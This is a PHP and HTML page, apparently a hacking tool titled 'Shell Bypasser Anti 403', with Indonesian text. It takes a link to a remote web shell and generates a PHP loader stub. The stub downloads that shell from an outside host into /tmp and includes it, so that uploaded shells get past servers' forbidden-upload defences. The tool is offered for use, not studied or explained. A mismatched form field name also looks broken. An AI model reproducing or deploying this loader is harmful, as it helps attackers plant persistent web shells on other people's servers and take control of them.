<html>
<head>
<title>[+] Shell Bypasser Anti 403 [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white" onload="ascii();"><center>
  <style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
  background: transparent;
    font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
.courier {
  font-family: Courier;
}
.notvuln {
  color: red;
}
.vuln {
  color: green;
}
</style>
<script type="text/javascript">
  function select_all() {
var text_val = document.getElementById('select');
text_val.focus(); // Focus on textarea 
text_val.select();// Select all text  
document.execCommand("Copy");
document.getElementById('select').focus();
}
</script>
<form method="post" enctype="multipart/form-data">
<font face=courier size=5>PHP Shell Bypasser Anti 403<br>
  <font size="3">Bypass Shell Yang Terkena Forbidden Ketika Upload</font></font><hr>
<font face=courier>Link : &nbsp;
<input type="url" size="40" name="text" class="courier" placeholder="https://exploits.my.id/shellku.txt">&nbsp;
<input type="submit" name="startbf" value="Gaskan">
</form><br>
<?php
//<input type="url" size="40" name="url" class="courier" placeholder="https://exploits.my.id/shellku.txt" oninvalid="this.setCustomValidity('masukin link shell bre, bukan codenya wkwk')">
$random = mt_rand(10000000,99999999);
$shell = $_POST['url'];
if ($shell) {
  echo '<hr>Done Bypassed !!!<br>[ <font style="cursor: pointer;" onclick="select_all();" color="orange">Select All & Copy</font> ]<hr>';
  echo "<textarea id='select'>";
  echo htmlspecialchars('<?php 
    // Created by Unknown45 | https://exploits.my.id/
    if(!file_exists("/tmp/'.$random.'")){$a=file_get_contents("'.$shell.'");file_put_contents("/tmp/'.$random.'", $a);echo"Loading ...<br>Unknown45 - 2021<meta http-equiv=refresh content=0>";}else{include "/tmp/'.$random.'";}if(filesize("/tmp/'.$random.'") == "0"){$a=file_get_contents("'.$shell.'");file_put_contents("/tmp/'.$random.'", $a);echo"Loading ...<br>Unknown45 - 2021<meta http-equiv=refresh content=0>";} ?>');
  echo "</textarea>";
}
?>
<hr><font size="3">Unknown45 - 2021</font>